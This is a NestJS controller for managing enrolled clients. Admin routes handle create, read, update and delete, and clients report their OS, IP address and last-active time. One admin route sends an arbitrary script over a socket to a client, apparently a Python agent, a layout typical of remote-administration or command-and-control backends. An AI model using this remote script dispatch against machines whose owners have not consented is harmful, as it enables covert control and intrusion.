import {
  Controller,
  Get,
  Post,
  Body,
  Patch,
  Param,
  Delete,
  HttpCode,
} from '@nestjs/common';
import { ClientService } from './client.service';
import { CreateClientDto } from './dto/create-client.dto';
import { UpdateClientDto } from './dto/update-client.dto';
import { ApiTags } from '@nestjs/swagger';
import { SocketGateway } from 'src/socket/socket.gateway';
import { Roles } from 'src/auth/decorators/roles.decorator';
import { Role } from 'src/auth/role.enum';
import { ClientDecorator } from 'src/auth/decorators/client.decorator';
import { Client } from './entities/client.entity';

@ApiTags('Client')
@Controller('client')
export class ClientController {
  constructor(
    private readonly clientService: ClientService,
    private readonly socketGateway: SocketGateway,
  ) {}

  @Roles(Role.Admin)
  @Post()
  create(@Body() createClientDto: CreateClientDto) {
    return this.clientService.create(createClientDto);
  }

  @Roles(Role.Admin)
  @Get()
  findAll() {
    return this.clientService.findAll();
  }

  @Roles(Role.Admin)
  @Get(':id')
  findOne(@Param('id') id: string) {
    return this.clientService.findOne(+id);
  }

  @Roles(Role.Admin)
  @Patch(':id')
  update(@Param('id') id: string, @Body() updateClientDto: UpdateClientDto) {
    return this.clientService.update(+id, updateClientDto);
  }

  @Roles(Role.Client)
  @Post('update-os')
  updateOS(@Body() body: { os: string }, @ClientDecorator() client: Client) {
    return this.clientService.updateOS(client.id, body.os);
  }

  @Roles(Role.Client)
  @Post('update-ip')
  updateIP(@Body() body: { ip: string }, @ClientDecorator() client: Client) {
    return this.clientService.updateIP(client.id, body.ip);
  }

  @Roles(Role.Client)
  @Post('update-last-active-at')
  updateLastActiveAt(@ClientDecorator() client: Client) {
    return this.clientService.updateLastActiveAt(client.id);
  }

  @Roles(Role.Admin)
  @Delete(':id')
  remove(@Param('id') id: string) {
    return this.clientService.remove(+id);
  }

  @Roles(Role.Admin)
  @Post('script')
  @HttpCode(200)
  script(@Body() body: { clientId: number; script: string }) {
    this.socketGateway.sendScriptToPython(body.clientId, body.script);
  }
}
